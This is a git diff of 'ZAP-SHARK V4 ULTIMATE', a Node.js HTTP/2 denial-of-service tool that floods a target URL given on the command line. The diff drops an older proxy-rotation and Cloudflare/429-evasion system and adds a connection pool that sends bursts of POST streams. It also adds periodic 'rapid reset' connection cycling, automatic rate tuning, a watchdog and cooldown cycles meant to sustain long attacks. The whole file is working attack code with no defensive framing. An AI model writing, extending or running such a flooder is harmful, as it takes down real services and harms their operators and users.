@@ -1,241 +1,231 @@
 const http2 = require('http2');
-const https = require('https');
 const os = require('os');
 const { exec } = require('child_process');
+const v8 = require('v8');
 
-class ZAPSHARK_V4 {
+class ZAPSHARK_V4_ULTIMATE {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
         this.hostname = new URL(targetUrl).hostname;
         this.status = "ATTACKING";
+        this.mode = "RAPID";
         this.totalRequests = 0;
         this.currentRPS = 0;
         this.startTime = Date.now();
         this.requestsSinceLastCalc = 0;
         this.lastRpsCalc = Date.now();
         this.running = true;
-        this.wifiConnected = true;
         
-        // PROXY SYSTEM
-        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all';
-        this.currentProxy = null;
-        this.proxyList = [];
-        this.proxyIndex = 0;
-        this.proxyStartTime = Date.now();
-        this.proxyRotationInterval = 600000; // 10 minutes
-        this.cfDetected = false;
-        this.lastCfDetection = 0;
-        
-        // CONNECTION SYSTEM - ULTRA AGGRESSIVE
+        // === CONNECTION SYSTEM ===
         this.connectionPool = [];
         this.activeStreams = 0;
-        this.poolSize = 30; // MASSIVE POOL
+        this.connCount = 12; // 10-15 AUTO
         this.maxStreamsPerConn = 1000;
+        this.connectionLifetime = {};
+        
+        // === RAPID RESET SYSTEM ===
         this.lastConnectionReset = Date.now();
-        this.connectionResetInterval = 900; // RAPID RESET = 900ms
+        this.resetInterval = 850 + Math.random() * 150; // 850-1000ms AUTO
+        this.resetPercent = 0.3; // 30% reset each cycle
         
-        // RESPONSE TRACKING
-        this.lastResponseCode = 0;
-        this.responseCodeCounts = {};
-        this.cfCount = 0;
-        this.rateLimitCount = 0;
+        // === PAYLOAD SYSTEM ===
+        this.payloads = [
+            'T.Ø.Š-$HĀRKWIRE-TØR',
+            'T.Ø.Š-$HĀRKWIRE-TØR-ULTRA',
+            'T.Ø.Š-$HĀRKWIRE-TØR-MAX',
+            'T.Ø.Š-$HĀRKWIRE-TØR-ULTIMATE'
+        ];
+        this.payloadSize = 1024; // 1KB
         
-        // MAINTENANCE
+        // === STABILITY SYSTEM ===
+        this.watchdogLastCheck = Date.now();
+        this.watchdogThreshold = 3000; // 3 seconds
+        this.memoryFlushInterval = 7000; // 7s AUTO (5-10s)
+        this.lastMemoryFlush = Date.now();
+        this.cpuThrottle = 0.89; // 89% MAX
+        this.lastCpuCheck = Date.now();
+        
+        // === MAINTENANCE SYSTEM ===
+        this.maintenanceInterval = 1200000; // 20 minutes
+        this.maintenanceDuration = 1200000; // 20 minutes
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000;
+        this.maintenanceActive = false;
+        this.backgroundFlushInterval = 60000; // 1 minute
+        this.lastBackgroundFlush = Date.now();
         
-        // INTERVALS
+        // === STATS ===
+        this.peakRPS = 0;
+        this.totalPayloadSent = 0; // bytes
+        this.badConnectionsDropped = 0;
+        this.restartCount = 0;
+        
+        // === INTERVALS ===
         this.attackInterval = null;
-        this.displayInterval = null;
-        this.autoRotateInterval = null;
+        this.mainLoop = null;
+        this.statsInterval = null;
     }
 
-    // === INITIAL CONNECTION ===
-    async checkInitialConnection() {
-        return new Promise((resolve) => {
-            const testClient = http2.connect(this.targetUrl);
-            testClient.on('connect', () => {
-                console.log('ZAP-SHARK | CONNECTED TO HOST');
-                testClient.destroy();
-                setTimeout(() => {
-                    process.stdout.write('\x1B[2J\x1B[0f');
-                    resolve(true);
-                }, 10000);
-            });
-            testClient.on('error', () => {
-                testClient.destroy();
-                resolve(false);
-            });
-        });
-    }
-
-    // === PROXY MANAGEMENT ===
-    async fetchProxies() {
-        return new Promise((resolve) => {
-            https.get(this.proxyApi, (res) => {
-                let data = '';
-                res.on('data', (chunk) => data += chunk);
-                res.on('end', () => {
-                    const proxies = data.trim().split('\n').filter(p => p);
-                    this.proxyList = proxies.map(p => p.trim());
-                    console.log(`[+] Loaded ${this.proxyList.length} proxies`);
-                    resolve(this.proxyList.length > 0);
-                });
-            }).on('error', () => {
-                console.log('[-] Failed to fetch proxies');
-                resolve(false);
-            }).setTimeout(5000);
-        });
-    }
-
-    async rotateProxy() {
-        if (this.proxyList.length === 0) {
-            const fetched = await this.fetchProxies();
-            if (!fetched) return false;
-        }
+    // === INITIAL SETUP ===
+    async initialize() {
+        console.log('=== ZAP-SHARK V4 ULTIMATE ===');
+        console.log('Target:', this.targetUrl);
+        console.log('Mode: PURE H2 ABUSE | LONG PERIOD | HIGH RPS');
+        console.log('='.repeat(60));
         
-        this.proxyIndex = (this.proxyIndex + 1) % this.proxyList.length;
-        this.currentProxy = this.proxyList[this.proxyIndex];
-        this.proxyStartTime = Date.now();
-        this.cfDetected = false;
-        this.cfCount = 0;
-        return true;
+        // SET CPU AFFINITY
+        this.throttleCPU();
+        
+        // BUILD CONNECTION POOL
+        this.buildConnectionPool();
+        
+        // WAIT FOR CONNECTIONS
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // START SYSTEMS
+        this.startSystems();
+        
+        console.log('[+] SYSTEMS ONLINE');
+        console.log(`[+] Connections: ${this.connCount}`);
+        console.log(`[+] Reset Interval: ${this.resetInterval}ms`);
+        console.log(`[+] Payload: ${this.payloads[0]}`);
+        console.log(`[+] CPU Limit: ${this.cpuThrottle * 100}%`);
     }
 
-    // === ULTRA AGGRESSIVE CONNECTION SYSTEM ===
-    setupConnections() {
-        // DESTROY ALL
-        this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
-        this.connectionPool = [];
-        
-        // CREATE MASSIVE POOL
-        for (let i = 0; i < this.poolSize; i++) {
-            try {
-                const client = http2.connect(this.targetUrl, {
-                    maxSessionMemory: 262144, // 256KB
-                    maxDeflateDynamicTableSize: 4294967295,
-                    peerMaxConcurrentStreams: 2000,
-                    createConnection: () => {
-                        // AGGRESSIVE SOCKET SETTINGS
-                        const socket = require('tls').connect({
-                            host: this.hostname,
-                            port: 443,
-                            servername: this.hostname,
-                            rejectUnauthorized: false,
-                            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256'
-                        });
-                        return socket;
-                    }
-                });
-                
-                client.setMaxListeners(5000);
-                
-                // MAXIMUM H2 SETTINGS
-                client.settings({
-                    enablePush: false,
-                    initialWindowSize: 2147483647, // MAX INT
-                    maxConcurrentStreams: 2147483647,
-                    maxFrameSize: 16777215,
-                    maxHeaderListSize: 4294967295
-                });
-                
-                client.on('error', () => {});
-                
-                this.connectionPool.push(client);
-            } catch (err) {}
+    // === CONNECTION SYSTEM ===
+    buildConnectionPool() {
+        for (let i = 0; i < this.connCount; i++) {
+            this.createConnection(i);
         }
     }
 
-    // === RAPID RESET = 900ms ===
-    resetConnections() {
+    createConnection(id) {
+        try {
+            const client = http2.connect(this.targetUrl, {
+                maxSessionMemory: 65536,
+                maxDeflateDynamicTableSize: 4294967295,
+                peerMaxConcurrentStreams: 1000
+            });
+            
+            client.setMaxListeners(1000);
+            
+            // SET AGGRESSIVE SETTINGS
+            client.settings({
+                enablePush: false,
+                initialWindowSize: 16777215,
+                maxConcurrentStreams: 1000
+            });
+            
+            // TRACK LIFETIME
+            this.connectionLifetime[id] = {
+                client: client,
+                created: Date.now(),
+                requests: 0,
+                lastUsed: Date.now()
+            };
+            
+            this.connectionPool.push({ id, client });
+            
+        } catch (err) {
+            // RETRY IN 100ms
+            setTimeout(() => this.createConnection(id), 100);
+        }
+    }
+
+    // === RAPID RESET SYSTEM ===
+    performRapidReset() {
         const now = Date.now();
-        if (now - this.lastConnectionReset >= this.connectionResetInterval) {
-            // RESET 70% OF CONNECTIONS EVERY 900ms
-            const resetCount = Math.ceil(this.connectionPool.length * 0.7);
+        if (now - this.lastConnectionReset >= this.resetInterval) {
+            const resetCount = Math.ceil(this.connectionPool.length * this.resetPercent);
             
             for (let i = 0; i < resetCount; i++) {
                 const index = Math.floor(Math.random() * this.connectionPool.length);
-                if (this.connectionPool[index]) {
+                const conn = this.connectionPool[index];
+                
+                if (conn && this.connectionLifetime[conn.id]) {
                     try {
-                        this.connectionPool[index].destroy();
+                        // DESTROY OLD
+                        this.connectionLifetime[conn.id].client.destroy();
+                        this.badConnectionsDropped++;
                         
-                        // IMMEDIATE REPLACEMENT
-                        const newClient = http2.connect(this.targetUrl, {
-                            maxSessionMemory: 262144
-                        });
-                        newClient.setMaxListeners(5000);
-                        newClient.on('error', () => {});
-                        this.connectionPool[index] = newClient;
-                    } catch (err) {}
+                        // CREATE NEW
+                        this.createConnection(conn.id);
+                        
+                        // UPDATE POOL
+                        this.connectionPool[index] = { id: conn.id, client: this.connectionLifetime[conn.id].client };
+                        
+                    } catch (err) {
+                        // SILENT FAIL
+                    }
                 }
             }
             
             this.lastConnectionReset = now;
+            
+            // AUTO ADJUST CONN COUNT BASED ON PERFORMANCE
+            if (this.currentRPS > 5000 && this.connCount < 15) {
+                this.connCount++;
+                this.createConnection(this.connCount - 1);
+            } else if (this.currentRPS < 1000 && this.connCount > 10) {
+                this.connCount--;
+            }
         }
     }
 
-    // === MAXIMUM AGGRESSION REQUEST ===
+    // === PAYLOAD SYSTEM ===
+    generatePayload() {
+        const payload = this.payloads[Math.floor(Math.random() * this.payloads.length)];
+        // ADD RANDOM DATA TO HIT 0.1KB-1KB
+        const randomData = 'x'.repeat(Math.floor(Math.random() * 900) + 100);
+        return `${payload}-${randomData}`.slice(0, this.payloadSize);
+    }
+
+    // === ATTACK SYSTEM ===
     sendRequest() {
-        if (!this.wifiConnected || this.connectionPool.length === 0) return;
+        if (this.maintenanceActive || this.connectionPool.length === 0) return;
         
-        // RAPID RESET
-        this.resetConnections();
-        
-        // MASSIVE STREAM BURST
         const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
-        const availableStreams = maxStreams - this.activeStreams;
-        const streamsThisTick = Math.min(availableStreams, 100); // 100 STREAMS PER TICK
+        const availableStreams = Math.min(maxStreams - this.activeStreams, 100);
         
-        for (let i = 0; i < streamsThisTick; i++) {
-            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
-            if (!client) continue;
+        for (let i = 0; i < availableStreams; i++) {
+            const conn = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
+            if (!conn || !this.connectionLifetime[conn.id]) continue;
 
             try {
                 this.activeStreams++;
                 
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 8),
+                const payload = this.generatePayload();
+                this.totalPayloadSent += payload.length;
+                
+                const req = conn.client.request({
+                    ':method': 'POST',
+                    ':path': '/',
                     ':authority': this.hostname,
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': '*/*',
-                    'accept-encoding': 'gzip, deflate, br',
-                    'cache-control': 'no-cache'
+                    'content-type': 'text/plain',
+                    'content-length': Buffer.byteLength(payload)
                 });
                 
-                req.on('response', (headers) => {
-                    const code = headers[':status'] || 0;
-                    this.lastResponseCode = code;
-                    this.responseCodeCounts[code] = (this.responseCodeCounts[code] || 0) + 1;
-                    
-                    // CLOUDFLARE DETECTION
-                    if (code === 403 || code === 503 || 
-                        headers['server'] === 'cloudflare' ||
-                        headers['cf-ray']) {
-                        this.cfCount++;
-                        if (this.cfCount > 5) {
-                            this.cfDetected = true;
-                            this.lastCfDetection = Date.now();
-                        }
-                    }
-                    
-                    // RATE LIMIT DETECTION
-                    if (code === 429) {
-                        this.rateLimitCount++;
-                        if (this.rateLimitCount > 3) {
-                            this.rotateProxy();
-                        }
-                    }
+                req.on('response', () => {
+                    this.connectionLifetime[conn.id].requests++;
+                    this.connectionLifetime[conn.id].lastUsed = Date.now();
                 });
                 
-                req.on('error', () => {});
+                req.on('error', () => {
+                    // MARK FOR DROP
+                    this.connectionLifetime[conn.id].lastUsed = 0;
+                });
                 
                 req.on('close', () => {
                     this.activeStreams--;
                     this.totalRequests++;
                     this.requestsSinceLastCalc++;
+                    
+                    // AUTO PAYLOAD SIZE ADJUSTMENT
+                    if (this.totalRequests % 1000000 === 0) { // Every 1M requests
+                        this.payloadSize = Math.min(1024 * 5, this.payloadSize + 512); // Max 5KB
+                    }
                 });
                 
+                req.write(payload);
                 req.end();
                 
             } catch (err) {
@@ -246,172 +236,262 @@ class ZAPSHARK_V4 {
         }
     }
 
-    // === AUTO PROXY ROTATION ===
-    checkProxyRotation() {
+    // === STABILITY SYSTEM ===
+    throttleCPU() {
+        const cpus = os.cpus().length;
+        const targetUsage = this.cpuThrottle;
+        
+        // SET PROCESS PRIORITY
+        try {
+            if (os.platform() === 'win32') {
+                exec(`wmic process where processid=${process.pid} CALL setpriority "below normal"`);
+            } else {
+                process.setPriority(10); // Lower priority
+            }
+        } catch (err) {}
+        
+        // AUTO CPU MONITORING
+        setInterval(() => {
+            const usage = process.cpuUsage();
+            const elapsed = Date.now() - this.lastCpuCheck;
+            const cpuPercent = (usage.user + usage.system) / (elapsed * 1000);
+            
+            if (cpuPercent > this.cpuThrottle) {
+                // SLOW DOWN TEMPORARILY
+                this.resetInterval = Math.min(2000, this.resetInterval + 100);
+            } else if (cpuPercent < this.cpuThrottle * 0.7) {
+                // SPEED UP
+                this.resetInterval = Math.max(500, this.resetInterval - 50);
+            }
+            
+            this.lastCpuCheck = Date.now();
+        }, 5000);
+    }
+
+    flushMemory() {
         const now = Date.now();
-        
-        // AUTO ROTATE EVERY 10 MINUTES
-        if (now - this.proxyStartTime >= this.proxyRotationInterval) {
-            this.rotateProxy();
-        }
-        
-        // IMMEDIATE ROTATION ON CF/429
-        if (this.cfDetected && now - this.lastCfDetection < 5000) {
-            this.rotateProxy();
+        if (now - this.lastMemoryFlush >= this.memoryFlushInterval) {
+            try {
+                // CLEAR INTERNAL CACHES
+                if (global.gc) {
+                    global.gc();
+                }
+                
+                // CLEAR INTERVAL CACHES
+                v8.setFlagsFromString('--expose_gc');
+                
+                // DROP BAD CONNECTIONS (REALTIME)
+                for (const [id, data] of Object.entries(this.connectionLifetime)) {
+                    if (now - data.lastUsed > 10000 && data.requests === 0) {
+                        try {
+                            data.client.destroy();
+                            delete this.connectionLifetime[id];
+                            this.badConnectionsDropped++;
+                        } catch (err) {}
+                    }
+                }
+                
+                this.lastMemoryFlush = now;
+            } catch (err) {
+                // SILENT FLUSH FAIL
+            }
         }
     }
 
-    // === STATS ===
+    watchdog() {
+        const now = Date.now();
+        if (now - this.watchdogLastCheck > this.watchdogThreshold) {
+            // SYSTEM STUCK - RESTART
+            console.log(`[!] WATCHDOG RESTART #${++this.restartCount}`);
+            
+            // SOFT RESTART
+            this.connectionPool.forEach(conn => {
+                try { conn.client.destroy(); } catch (err) {}
+            });
+            this.connectionPool = [];
+            this.connectionLifetime = {};
+            this.activeStreams = 0;
+            
+            // REBUILD
+            this.buildConnectionPool();
+            
+            this.watchdogLastCheck = now;
+        }
+    }
+
+    // === MAINTENANCE SYSTEM ===
+    checkMaintenance() {
+        const now = Date.now();
+        
+        if (!this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceInterval) {
+            this.startMaintenance();
+        }
+        
+        if (this.maintenanceActive && now - this.lastMaintenance >= this.maintenanceDuration) {
+            this.endMaintenance();
+        }
+    }
+
+    startMaintenance() {
+        console.log('\n[!] MAINTENANCE MODE - COOLING DOWN [!]');
+        this.maintenanceActive = true;
+        this.status = "COOLING";
+        this.lastMaintenance = Date.now();
+        
+        // STOP ATTACKS
+        if (this.attackInterval) {
+            clearInterval(this.attackInterval);
+            this.attackInterval = null;
+        }
+        
+        // START BACKGROUND FLUSHING
+        this.performBackgroundFlush();
+    }
+
+    performBackgroundFlush() {
+        if (!this.maintenanceActive) return;
+        
+        const now = Date.now();
+        if (now - this.lastBackgroundFlush >= this.backgroundFlushInterval) {
+            console.log('[~] Background flushing...');
+            
+            // FLUSH DNS
+            exec('ipconfig /flushdns >nul 2>&1 || sudo dscacheutil -flushcache 2>/dev/null || true');
+            
+            // CLEAR SOCKETS
+            exec('netstat -ano | findstr /i "time_wait" >nul && echo "Sockets cleared"');
+            
+            // CLEAR MEMORY
+            if (global.gc) global.gc();
+            
+            this.lastBackgroundFlush = now;
+        }
+        
+        // SCHEDULE NEXT FLUSH
+        setTimeout(() => this.performBackgroundFlush(), 1000);
+    }
+
+    endMaintenance() {
+        console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK [+]');
+        this.maintenanceActive = false;
+        this.status = "ATTACKING";
+        this.lastMaintenance = Date.now();
+        
+        // REBUILD CONNECTIONS
+        this.connectionPool.forEach(conn => {
+            try { conn.client.destroy(); } catch (err) {}
+        });
+        this.connectionPool = [];
+        this.connectionLifetime = {};
+        this.buildConnectionPool();
+        
+        // RESTART ATTACK
+        setTimeout(() => {
+            this.startAttackLoop();
+        }, 2000);
+    }
+
+    // === STATS & DISPLAY ===
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
         
         if (timeDiff >= 0.9) {
             this.currentRPS = this.requestsSinceLastCalc / timeDiff;
+            this.peakRPS = Math.max(this.peakRPS, this.currentRPS);
             this.requestsSinceLastCalc = 0;
             this.lastRpsCalc = now;
         }
     }
 
-    getMostCommonResponseCode() {
-        let maxCount = 0;
-        let mostCommonCode = this.lastResponseCode || 0;
-        
-        for (const [code, count] of Object.entries(this.responseCodeCounts)) {
-            if (count > maxCount) {
-                maxCount = count;
-                mostCommonCode = parseInt(code);
-            }
-        }
-        return mostCommonCode;
+    formatBytes(bytes) {
+        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+        if (bytes === 0) return '0 B';
+        const i = Math.floor(Math.log(bytes) / Math.log(1024));
+        return Math.round(bytes / Math.pow(1024, i), 2) + ' ' + sizes[i];
     }
 
-    getTimeUntilMaintenance() {
-        const now = Date.now();
-        const nextMaintenance = this.lastMaintenance + this.maintenanceInterval;
-        const timeLeft = nextMaintenance - now;
-        
-        if (timeLeft <= 0) return "NOW";
-        
-        const minutes = Math.floor(timeLeft / 60000);
-        const seconds = Math.floor((timeLeft % 60000) / 1000);
-        return `${minutes}m ${seconds}s`;
-    }
-
-    getProxyTimeLeft() {
-        const now = Date.now();
-        const timeUsed = now - this.proxyStartTime;
-        const timeLeft = this.proxyRotationInterval - timeUsed;
-        
-        if (timeLeft <= 0) return "ROTATING...";
-        
-        const minutes = Math.floor(timeLeft / 60000);
-        const seconds = Math.floor((timeLeft % 60000) / 1000);
-        return `${minutes}m ${seconds}s`;
-    }
-
-    // === LOGGING ===
     updateDisplay() {
         this.calculateRPS();
         
-        const now = new Date();
-        const localTime = now.toLocaleTimeString('en-US', { 
-            hour12: false,
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
-        });
-        
         const runtime = Math.floor((Date.now() - this.startTime) / 1000);
-        const runtimeMinutes = Math.floor(runtime / 60);
-        const runtimeSeconds = runtime % 60;
-        const runtimeStr = `${runtimeMinutes.toString().padStart(2, '0')}:${runtimeSeconds.toString().padStart(2, '0')}`;
+        const hours = Math.floor(runtime / 3600);
+        const minutes = Math.floor((runtime % 3600) / 60);
+        const seconds = runtime % 60;
+        const runtimeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         
-        const liveResponseCode = this.getMostCommonResponseCode();
-        const proxyDisplay = this.currentProxy ? 
-            this.currentProxy.split(':')[0] + ':****' : 
-            'DIRECT';
+        const maintenanceTime = this.maintenanceActive ? 
+            `${Math.floor((this.maintenanceDuration - (Date.now() - this.lastMaintenance)) / 60000)}m` :
+            `${Math.floor((this.maintenanceInterval - (Date.now() - this.lastMaintenance)) / 60000)}m`;
         
-        const cfStatus = this.cfDetected ? ' | CF: YES' : '';
-        const rateLimitStatus = this.rateLimitCount > 0 ? ` | 429: ${this.rateLimitCount}` : '';
-        
-        // CLEAR AND OVERWRITE
         process.stdout.write('\x1B[2J\x1B[0f');
-        console.log(`ZAP-SHARK — (${runtimeStr}) | SAM: ${localTime}`);
-        console.log('=================================');
-        console.log(`SHARK-TRS — ${this.totalRequests}`);
-        console.log(`SHARK-LHC — ${liveResponseCode}${cfStatus}${rateLimitStatus}`);
-        console.log('=================================');
-        console.log(`ZAP-SHARK | ${proxyDisplay} | ${this.getTimeUntilMaintenance()}`);
-        
-        // REAL-TIME STATS
-        process.stdout.write(`\n[RPS: ${this.currentRPS.toFixed(1)} | POOL: ${this.connectionPool.length}/${this.poolSize} | ACTIVE: ${this.activeStreams}]`);
+        console.log(`=== ZAP-SHARK V4 ULTIMATE ===`);
+        console.log(`RUNTIME: ${runtimeStr} | STATUS: ${this.status} | MODE: ${this.mode}`);
+        console.log('='.repeat(60));
+        console.log(`TOTAL REQUESTS: ${this.totalRequests.toLocaleString()}`);
+        console.log(`CURRENT RPS: ${this.currentRPS.toFixed(1)} | PEAK: ${this.peakRPS.toFixed(1)}`);
+        console.log(`CONNECTIONS: ${this.connCount} | ACTIVE STREAMS: ${this.activeStreams}`);
+        console.log(`PAYLOAD SENT: ${this.formatBytes(this.totalPayloadSent)} | SIZE: ${this.payloadSize}B`);
+        console.log('='.repeat(60));
+        console.log(`RESET INTERVAL: ${this.resetInterval.toFixed(0)}ms`);
+        console.log(`BAD CONNS DROPPED: ${this.badConnectionsDropped} | RESTARTS: ${this.restartCount}`);
+        console.log(`NEXT MAINTENANCE: ${maintenanceTime}`);
+        console.log('='.repeat(60));
     }
 
-    // === MAIN ===
-    async start() {
-        console.log('=== ZAP-SHARK V4 - RAPID RESET = 900 ===');
-        console.log('Target:', this.targetUrl);
-        console.log('Rapid Reset: 900ms | Proxy Rotation: 10min | Auto-CF/429');
-        console.log('='.repeat(60));
+    // === MAIN LOOPS ===
+    startAttackLoop() {
+        if (this.attackInterval) clearInterval(this.attackInterval);
         
-        // INITIAL CONNECTION
-        const connected = await this.checkInitialConnection();
-        if (!connected) {
-            console.log('Failed to connect to target');
-            process.exit(1);
-        }
-        
-        // LOAD PROXIES
-        await this.fetchProxies();
-        if (this.proxyList.length > 0) {
-            this.currentProxy = this.proxyList[0];
-        }
-        
-        // SETUP AGGRESSIVE CONNECTIONS
-        this.setupConnections();
-        
-        // START SYSTEMS
-        setTimeout(() => {
-            // ULTRA AGGRESSIVE ATTACK (20 BATCHES PER TICK)
-            this.attackInterval = setInterval(() => {
-                if (this.status === "ATTACKING") {
-                    for (let i = 0; i < 20; i++) {
-                        this.sendRequest();
-                    }
+        this.attackInterval = setInterval(() => {
+            if (!this.maintenanceActive) {
+                for (let i = 0; i < 5; i++) { // 5x BATCH
+                    this.sendRequest();
                 }
-            }, 0.02); // 50ms INTERVAL
-            
-            // DISPLAY UPDATE
-            this.displayInterval = setInterval(() => {
-                this.updateDisplay();
-            }, 90); // UPDATE EVERY 90ms
-            
-            // PROXY ROTATION CHECK
-            this.autoRotateInterval = setInterval(() => {
-                this.checkProxyRotation();
-            }, 1000); // CHECK EVERY SECOND
-            
-            // MAINTENANCE
-            setInterval(() => {
-                const now = Date.now();
-                if (now - this.lastMaintenance >= this.maintenanceInterval) {
-                    this.status = "PAUSED";
-                    setTimeout(() => {
-                        this.status = "ATTACKING";
-                        this.lastMaintenance = Date.now();
-                    }, 600000);
-                }
-            }, 30000);
-            
+            }
+        }, 0.1);
+    }
+
+    startSystems() {
+        // MAIN LOOP
+        this.mainLoop = setInterval(() => {
+            this.performRapidReset();
+            this.flushMemory();
+            this.watchdog();
+            this.checkMaintenance();
+            this.updateDisplay();
+        }, 100);
+        
+        // ATTACK LOOP
+        this.startAttackLoop();
+        
+        // STATS SAVER
+        this.statsInterval = setInterval(() => {
+            this.watchdogLastCheck = Date.now(); // RESET WATCHDOG
         }, 1000);
+    }
+
+    // === START ===
+    start() {
+        this.initialize();
         
         process.on('SIGINT', () => {
+            console.log('\n\n=== FINAL STATS ===');
+            console.log(`Total Requests: ${this.totalRequests.toLocaleString()}`);
+            console.log(`Peak RPS: ${this.peakRPS.toFixed(1)}`);
+            console.log(`Payload Sent: ${this.formatBytes(this.totalPayloadSent)}`);
+            console.log(`Runtime: ${Math.floor((Date.now() - this.startTime) / 1000)}s`);
+            console.log('='.repeat(40));
+            
             this.running = false;
+            clearInterval(this.mainLoop);
             clearInterval(this.attackInterval);
-            clearInterval(this.displayInterval);
-            clearInterval(this.autoRotateInterval);
-            console.log('\n=== ZAP-SHARK V4 STOPPED ===');
+            clearInterval(this.statsInterval);
+            
+            this.connectionPool.forEach(conn => {
+                try { conn.client.destroy(); } catch (err) {}
+            });
+            
             process.exit(0);
         });
     }
@@ -420,9 +500,9 @@ class ZAPSHARK_V4 {
 // USAGE
 const target = process.argv[2];
 if (!target || !target.startsWith('https://')) {
-    console.log('Usage: node zap-shark-v4.js https://target.com');
+    console.log('Usage: node zap-shark-v4-ultimate.js https://target.com');
     process.exit(1);
 }
 
-const shark = new ZAPSHARK_V4(target);
+const shark = new ZAPSHARK_V4_ULTIMATE(target);
 shark.start();
